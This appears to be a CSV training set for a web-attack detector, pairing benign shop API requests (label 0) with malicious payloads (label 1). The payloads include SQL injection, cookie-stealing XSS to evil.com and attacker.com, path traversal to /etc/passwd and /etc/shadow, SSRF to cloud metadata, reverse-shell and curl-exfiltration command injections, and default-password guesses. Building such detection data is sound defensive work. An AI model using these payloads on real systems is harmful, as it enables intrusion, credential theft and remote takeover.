"text","label"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"url=file:///etc/passwd","1"
"page=40&limit=10","0"
"ping=`id`","1"
"Authorization: Bearer validtoken770","0"
"name=Nour email=696@mail.com","0"
"GET /api/users?id=' OR 1=1#","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /backup.sql HTTP/1.1","1"
"POST /settings User-Agent: python-requests/2.31.0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://10.0.0.1","1"
"username=admin&password=admin123","1"
"user_id=33&action=view","0"
"url=http://localhost:8080","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"category=audio page=3","0"
"GET /.env HTTP/1.1","1"
"category=audio page=8","0"
"GET /api/orders/7348","0"
"password spray attack detected multiple users","1"
"POST /api/data body=command| cat /etc/passwd","1"
"category=phones page=8","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"date=2024-01-15&type=order","0"
"GET /api/users/3232","0"
"file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"Authorization: Bearer validtoken268","0"
"filename=$(curl -s http://attacker.com/shell.sh)","1"
"search=' OR 'x'='x","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"exec=$(whoami)","1"
"POST /dashboard body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"include=../../../etc/shadow","1"
"title=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"name=Ahmed email=945@mail.com","0"
"include=../../../../proc/self/environ","1"
"search=tablet","0"
"search=headphones","0"
"GET /web.config HTTP/1.1","1"
"GET /backup.sql HTTP/1.1","1"
"repeated authentication failure admin account locked","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=247&action=view","0"
"PUT /settings User-Agent: python-requests/2.31.0","0"
"POST /api/feedback body=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"filename=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"login attempt failed username admin invalid credentials","1"
"search=headphones","0"
"GET /api/orders/7751","0"
"title=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"search=tablet","0"
"GET /api/login/5713","0"
"search=headphones","0"
"url=http://192.168.1.1","1"
"name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"DELETE /api/data?status=pending&priority=high","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"exec=|| nc -e /bin/sh attacker.com 4444","1"
"GET ..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /health HTTP/1.1","0"
"path=../../.git/config","1"
"file=../../../.env","1"
"message=<img src=`javascript:alert(1)`>","1"
"url=http://10.0.0.1","1"
"user=1'%09OR%091=1--","1"
"DELETE /api/data User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"id=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"url=http://localhost:8080","1"
"password spray attack detected multiple users","1"
"GET ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"PUT /api/orders?q=smartphone&brand=samsung","0"
"User-Agent: Nmap Scripting Engine","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"category=phones page=1","0"
"exec=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=phone","0"
"GET /admin HTTP/1.1","1"
"Authorization: Bearer validtoken261","0"
"name=Nour email=728@mail.com","0"
"page=32&limit=10","0"
"GET /api/users?id=' OR ''='","1"
"order_id=ORD-8360 status=confirmed","0"
"title=javascript:alert(document.cookie)","1"
"host=; ls -la","1"
"order_id=ORD-9907 status=confirmed","0"
"GET /health HTTP/1.1","0"
"include=../../.git/config","1"
"category=laptops page=6","0"
"GET /health HTTP/1.1","0"
"user_id=917&action=view","0"
"user=' OR ''='","1"
"GET /health HTTP/1.1","0"
"url=gopher://127.0.0.1:25/","1"
"status=pending&priority=high","0"
"Authorization: Bearer validtoken232","0"
"path=../../.git/config","1"
"Authorization: Bearer validtoken836","0"
"category=electronics&page=1","0"
"category=audio page=6","0"
"id=' OR 'x'='x","1"
"filename=| wget http://attacker.com/shell.sh","1"
"category=phones page=4","0"
"GET /api/orders User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"include=../../../etc/shadow","1"
"name=Nour email=559@mail.com","0"
"url=http://10.0.0.1","1"
"order_id=ORD-2487 status=confirmed","0"
"order_id=ORD-8626 status=confirmed","0"
"username=user&password=monkey","1"
"PUT /api/login User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"multiple failed login attempts detected for admin","1"
"DELETE /profile?category=electronics&page=1","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"page=43&limit=50","0"
"name=<iframe src=javascript:alert(1)>","1"
"Authorization: Bearer validtoken101","0"
"exec=| uname -a","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"order_id=ORD-8123 status=confirmed","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"cmd=& ipconfig","1"
"POST /settings body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /health HTTP/1.1","0"
"DELETE /api/products User-Agent: axios/1.6.0","0"
"POST /api/login username=id=1&id=2 UNION SELECT 1,2-- password=test","1"
"order_id=' OR 1=1--","1"
"category=laptops page=8","0"
"search=headphones","0"
"category=electronics&page=1","0"
"GET /health HTTP/1.1","0"
"url=gopher://127.0.0.1:25/","1"
"login attempt failed username admin invalid credentials","1"
"GET /health HTTP/1.1","0"
"user_id=284&action=view","0"
"name=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"category=audio page=10","0"
"q=smartphone&brand=samsung","0"
"name=Omar email=39@mail.com","0"
"search=headphones","0"
"page=1&limit=20","0"
"Authorization: Bearer validtoken425","0"
"POST /profile body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"search=laptop","0"
"GET /api/users?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"page=25&limit=10","0"
"name=Sara email=811@mail.com","0"
"DELETE /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"search='><script>alert(1)</script>","1"
"order_id=ORD-4539 status=confirmed","0"
"name=Omar email=710@mail.com","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"username=administrator&password=qwerty","1"
"page=47&limit=50","0"
"q=smartphone&brand=samsung","0"
"url=http://192.168.1.1","1"
"repeated authentication failure admin account locked","1"
"search=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"Authorization: Bearer validtoken172","0"
"search=phone","0"
"POST /api/search body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"POST /api/login username=') OR ('1'='1 password=test","1"
"category=tablets page=8","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"order_id=1' /*!OR*/ 1=1--","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"username=root&password=monkey","1"
"GET /etc/passwd%00","1"
"order_id=ORD-6593 status=confirmed","0"
"POST /api/feedback body=<svg/onload=alert(1)>","1"
"id=123&format=json","0"
"name=Sara email=273@mail.com","0"
"category=tablets page=4","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"title=<img src=x onerror=alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/orders/7557","0"
"name=Lina email=267@mail.com","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user=' UNION SELECT NULL,NULL--","1"
"GET /settings/4014","0"
"path=../../../.env","1"
"category=laptops page=8","0"
"url=gopher://127.0.0.1:25/","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"search=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"GET /.git/config HTTP/1.1","1"
"search=' OR 1=1--","1"
"search=javascript:alert(document.cookie)","1"
"page=15&limit=20","0"
"category=laptops page=7","0"
"GET /api/swagger.json HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"GET /backup.sql HTTP/1.1","1"
"search=phone","0"
"limit=20&offset=0","0"
"GET /.env HTTP/1.1","1"
"exec=|| nc -e /bin/sh attacker.com 4444","1"
"GET /api/products/6374","0"
"include=../../../../etc/passwd","1"
"search=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"search=laptop&sort=price","0"
"filename=; python -c 'import socket,subprocess'","1"
"multiple failed login attempts detected for admin","1"
"GET /dashboard/4766","0"
"category=audio page=9","0"
"username=root&password=1234567890","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"include=../../../../etc/passwd","1"
"name=<img src='x' onerror='alert(1)'>","1"
"POST /api/login User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"' OR ''='","1"
"GET /robots.txt scan probe reconnaissance","1"
"ping=; ls -la","1"
"category=phones page=9","0"
"POST /api/data body=command& whoami","1"
"brute force attempt on login endpoint from single ip","1"
"GET /settings User-Agent: PostmanRuntime/7.36.0","0"
"GET /server-status HTTP/1.1","1"
"url=http://10.0.0.1","1"
"Authorization: Bearer validtoken664","0"
"url=http://127.0.0.1/admin","1"
"brute force attempt on login endpoint from single ip","1"
"status=pending&priority=high","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"....//....//etc/passwd","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /health HTTP/1.1","0"
"path=../../../../etc/shadow","1"
"Authorization: Bearer validtoken449","0"
"username=user&password=123456","1"
"search=""><script>alert(1)</script>","1"
"host=; ls -la","1"
"page=14&limit=20","0"
"GET /api/users/7431","0"
"<iframe src=javascript:alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /admin HTTP/1.1","1"
"GET /api/search?q=%3Cscript%3Ealert(1)%3C/script%3E","1"
"PUT /settings?user=ahmed&filter=active","0"
"order_id=admin'#","1"
"username=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"search=headphones","0"
"path=php://filter/convert.base64-encode/resource=config.php","1"
"DELETE /api/search?category=electronics&page=1","0"
"url=gopher://127.0.0.1:25/","1"
"Authorization: Bearer validtoken908","0"
"GET /api/search?q=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"cmd=| cat /etc/passwd","1"
"GET /api/swagger.json HTTP/1.1","1"
"1'||'1'='1","1"
"url=dict://127.0.0.1:11211/","1"
"user=1'	OR	1=1--","1"
"GET /api/users?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"Authorization: Bearer validtoken140","0"
"login attempt failed username admin invalid credentials","1"
"GET /phpmyadmin HTTP/1.1","1"
"POST /api/login username=1 UNION SELECT user(),database()-- password=test","1"
"user_id=808&action=view","0"
"GET /config.php HTTP/1.1","1"
"POST /api/products?limit=20&offset=0","0"
"GET /actuator/env HTTP/1.1","1"
"POST /api/data body=command| cat /etc/passwd","1"
"login attempt failed username admin invalid credentials","1"
"GET /api/users?id=admin'#","1"
"host=$(curl -s http://attacker.com/shell.sh)","1"
"search=laptop&sort=price","0"
"GET /web.config HTTP/1.1","1"
"brute force attempt on login endpoint from single ip","1"
"GET /console HTTP/1.1","1"
"POST /api/products body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/users?id=' OR '1'='1","1"
"& ipconfig","1"
"username=id=1&id=2 UNION SELECT 1,2--","1"
"order_id=ORD-3492 status=confirmed","0"
"order_id=ORD-4521 status=confirmed","0"
"POST /api/login username=' UNION SELECT NULL-- password=test","1"
"user_id=169&action=view","0"
"password spray attack detected multiple users","1"
"user_id=460&action=view","0"
"GET /.git/config HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"message=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"POST /api/feedback body=<svg/onload=alert(1)>","1"
"username=root&password=batman","1"
"GET ../../../../var/log/apache2/access.log","1"
"q=smartphone&brand=samsung","0"
"Authorization: Bearer validtoken954","0"
"exec=; ping -c 4 attacker.com","1"
"path=/etc/passwd%00","1"
"name=Ahmed email=586@mail.com","0"
"url=http://localhost:8080","1"
"username=admin&password=admin123","1"
"name=Ahmed email=391@mail.com","0"
"Authorization: Bearer validtoken332","0"
"username=admin&password=qwerty","1"
"order_id=ORD-6108 status=confirmed","0"
"order_id=' UNION SELECT NULL--","1"
"POST /dashboard body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"name=Sara email=142@mail.com","0"
"category=laptops page=4","0"
"category=phones page=1","0"
"ping=; cat /etc/shadow","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"order_id=ORD-6074 status=confirmed","0"
"comment=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"GET /robots.txt scan probe reconnaissance","1"
"Authorization: Bearer validtoken875","0"
"file:///etc/passwd","1"
"name=<script >alert(1)</script >","1"
"title=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"search=1' /*!OR*/ 1=1--","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /phpmyadmin HTTP/1.1","1"
"GET /api/users?limit=20&offset=0","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"search=tablet","0"
"GET /health HTTP/1.1","0"
"search=headphones","0"
"page=30&limit=20","0"
"GET /api/search?q=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"path=/etc/passwd%00","1"
"category=phones page=3","0"
"username=root&password=abc123","1"
"url=gopher://127.0.0.1:25/","1"
"search=<img src='x' onerror='alert(1)'>","1"
"| uname -a","1"
"GET /api/orders User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /api/files?name=../../.git/config","1"
"PUT /profile?limit=20&offset=0","0"
"GET /server-status HTTP/1.1","1"
"| uname -a","1"
"GET /api/login/3958","0"
"host=| wget http://attacker.com/shell.sh","1"
"search=laptop","0"
"search=laptop","0"
"page=19&limit=20","0"
"page=47&limit=50","0"
"user_id=440&action=view","0"
"search=laptop&sort=price","0"
"GET /health HTTP/1.1","0"
"page=38&limit=20","0"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"username=admin&password=superman","1"
"GET /server-status HTTP/1.1","1"
"$(curl -s http://attacker.com/shell.sh)","1"
"search=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"GET /phpmyadmin HTTP/1.1","1"
"name=Sara email=159@mail.com","0"
"url=http://localhost:8080","1"
"POST /dashboard body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user_id=225&action=view","0"
"GET /health HTTP/1.1","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/search?q=<svg onload=alert(1)>","1"
"POST /api/feedback body=%3Cscript%3Ealert(1)%3C/script%3E","1"
"PUT /profile?category=electronics&page=1","0"
"page=33&limit=20","0"
"repeated authentication failure admin account locked","1"
"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /profile/8704","0"
"name=Ahmed email=751@mail.com","0"
"user_id=925&action=view","0"
"search=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"include=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"filename=; ping -c 4 attacker.com","1"
"search=tablet","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"POST /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"order_id=1 UNION SELECT 1,2,3--","1"
"brute force attempt on login endpoint from single ip","1"
"GET /api/users?id=1' OR 0x31=0x31--","1"
"page=42&limit=50","0"
"title=<script>alert(1)</script>","1"
"page=49&limit=10","0"
"file=/etc/passwd%00","1"
"message=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"GET /dashboard/109","0"
"DELETE /settings?user=ahmed&filter=active","0"
"order_id=ORD-4086 status=confirmed","0"
"GET /wp-admin HTTP/1.1","1"
"GET /.env HTTP/1.1","1"
"category=audio page=1","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"order_id=ORD-5184 status=confirmed","0"
"path=../../../.env","1"
"host=& net user hacker Password1 /add","1"
"file=php://filter/convert.base64-encode/resource=config.php","1"
"url=dict://127.0.0.1:11211/","1"
"name=';alert(String.fromCharCode(88,83,83))//","1"
"GET /settings/441","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-6824 status=confirmed","0"
"url=gopher://127.0.0.1:25/","1"
"Authorization: Bearer validtoken649","0"
"search=tablet","0"
"| cat /etc/passwd","1"
"PUT /api/data User-Agent: axios/1.6.0","0"
"host=; python -c 'import socket,subprocess'","1"
"POST /dashboard body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"multiple failed login attempts detected for admin","1"
"PUT /api/users User-Agent: PostmanRuntime/7.36.0","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"filename=; cat /etc/shadow","1"
"GET ....//....//etc/passwd","1"
"GET /web.config HTTP/1.1","1"
"category=tablets page=7","0"
"GET /server-status HTTP/1.1","1"
"password spray attack detected multiple users","1"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"PUT /api/data User-Agent: PostmanRuntime/7.36.0","0"
"GET /api/swagger.json HTTP/1.1","1"
"PUT /api/products User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"url=http://10.0.0.1","1"
"order_id=ORD-2692 status=confirmed","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"password spray attack detected multiple users","1"
"POST /api/login username=1' /*!OR*/ 1=1-- password=test","1"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"user=ahmed&filter=active","0"
"page=8&limit=20","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"exec=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"GET /health HTTP/1.1","0"
"GET /.env HTTP/1.1","1"
"date=2024-01-15&type=order","0"
"user_id=733&action=view","0"
"user=admin'#","1"
"GET /health HTTP/1.1","0"
"page=48&limit=50","0"
"POST /api/data body=command| uname -a","1"
"1; DROP TABLE users--","1"
"ping=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"brute force attempt on login endpoint from single ip","1"
"name=Omar email=603@mail.com","0"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"description=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"message=<svg onload=alert(1)>","1"
"user_id=366&action=view","0"
"url=gopher://127.0.0.1:25/","1"
"Authorization: Bearer validtoken401","0"
"title=<script>alert(document.cookie)</script>","1"
"GET /health HTTP/1.1","0"
"GET /dashboard/7398","0"
"search=admin'--","1"
"<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /api/login User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"username=admin&password=admin123","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"User-Agent: Nikto/2.5.0","1"
"User-Agent: Nikto/2.5.0","1"
"file=../../../../proc/self/environ","1"
"brute force attempt on login endpoint from single ip","1"
"& whoami","1"
"Authorization: Bearer validtoken139","0"
"GET /backup.sql HTTP/1.1","1"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"description=<svg/onload=alert(1)>","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/data/3727","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"search=' OR 1=1 LIMIT 1--","1"
"category=phones page=2","0"
"POST /api/data body=command| uname -a","1"
"fetch=http://internal-service:8080/secret","1"
"GET /wp-admin HTTP/1.1","1"
"search=headphones","0"
"Authorization: Bearer validtoken390","0"
"GET /api/data User-Agent: axios/1.6.0","0"
"'; WAITFOR DELAY '0:0:5'--","1"
"GET /api/users?id=' OR 'x'='x","1"
"GET /.git/config HTTP/1.1","1"
"url=http://metadata.google.internal","1"
"GET /api/files?name=../../../.env","1"
"POST /api/search body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"url=dict://127.0.0.1:11211/","1"
"user_id=234&action=view","0"
"q=smartphone&brand=samsung","0"
"username=admin&password=qwerty","1"
"search=laptop&sort=price","0"
"GET /api/login/5947","0"
"User-Agent: masscan/1.3","1"
"POST /api/data body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/users?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"GET /api/files?name=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"search=headphones","0"
"page=44&limit=10","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"order_id=ORD-1822 status=confirmed","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/files?name=file:///etc/passwd","1"
"POST /api/login username=1 OR 1=1 password=test","1"
"name=<a href='javascript:alert(1)'>click</a>","1"
"GET /api/search?q=%3Cscript%3Ealert(1)%3C/script%3E","1"
"user=ahmed&filter=active","0"
"GET /.git/config HTTP/1.1","1"
"brute force attempt on login endpoint from single ip","1"
"username=administrator&password=123456","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Lina email=342@mail.com","0"
"user_id=317&action=view","0"
"include=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /server-status HTTP/1.1","1"
"search=<script >alert(1)</script >","1"
"category=tablets page=7","0"
"page=22&limit=50","0"
"category=phones page=8","0"
"comment=';alert(String.fromCharCode(88,83,83))//","1"
"user_id=472&action=view","0"
"page=2&limit=20","0"
"multiple failed login attempts detected for admin","1"
"page=6&limit=50","0"
"GET /backup.sql HTTP/1.1","1"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"url=gopher://127.0.0.1:25/","1"
"order_id=ORD-4618 status=confirmed","0"
"user_id=37&action=view","0"
"url=file:///etc/passwd","1"
"<details open ontoggle=alert(1)>","1"
"DELETE /dashboard?q=smartphone&brand=samsung","0"
"GET /health HTTP/1.1","0"
"name=Lina email=437@mail.com","0"
"limit=20&offset=0","0"
"brute force attempt on login endpoint from single ip","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"url=dict://127.0.0.1:11211/","1"
"search=1 UNION SELECT 1,2,3--","1"
"POST /api/feedback body=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"DELETE /api/products?date=2024-01-15&type=order","0"
"GET /wp-admin HTTP/1.1","1"
"search=laptop","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"search=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"POST /api/orders User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"filename=& net user hacker Password1 /add","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"password spray attack detected multiple users","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=laptops page=3","0"
"username=root&password=qwerty","1"
"order_id=ORD-4187 status=confirmed","0"
"url=file:///etc/passwd","1"
"file=../../../var/www/html/config.php","1"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/feedback body=<iframe src=javascript:alert(1)>","1"
"url=http://127.0.0.1/admin","1"
"category=tablets page=6","0"
"GET /actuator/env HTTP/1.1","1"
"username=administrator&password=password123","1"
"q=smartphone&brand=samsung","0"
"url=http://10.0.0.1","1"
"GET /api/files?name=../../../../var/log/apache2/access.log","1"
"POST /api/login body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /server-status HTTP/1.1","1"
"DELETE /api/products?status=pending&priority=high","0"
"user=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"GET /api/users/7402","0"
"name=Ahmed email=802@mail.com","0"
"file:///etc/passwd","1"
"; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"..%2F..%2F..%2Fetc%2Fpasswd","1"
"ping=; cat /etc/shadow","1"
"User-Agent: Nmap Scripting Engine","1"
"GET /config.php HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"url=file:///etc/passwd","1"
"User-Agent: Nmap Scripting Engine","1"
"POST /api/data body=command|| nc -e /bin/sh attacker.com 4444","1"
"url=http://10.0.0.1","1"
"exec=; ls -la","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"User-Agent: Nikto/2.5.0","1"
"name=Omar email=813@mail.com","0"
"filename=| wget http://attacker.com/shell.sh","1"
"category=audio page=6","0"
"filename=& whoami","1"
"order_id=ORD-4265 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /profile body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/users/1984","0"
"POST /api/data body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"username=root&password=superman","1"
"POST /api/login username=' OR 1=1# password=test","1"
"DELETE /api/data?search=laptop&sort=price","0"
"Authorization: Bearer validtoken806","0"
"POST /api/login body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"PUT /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"include=php://filter/convert.base64-encode/resource=config.php","1"
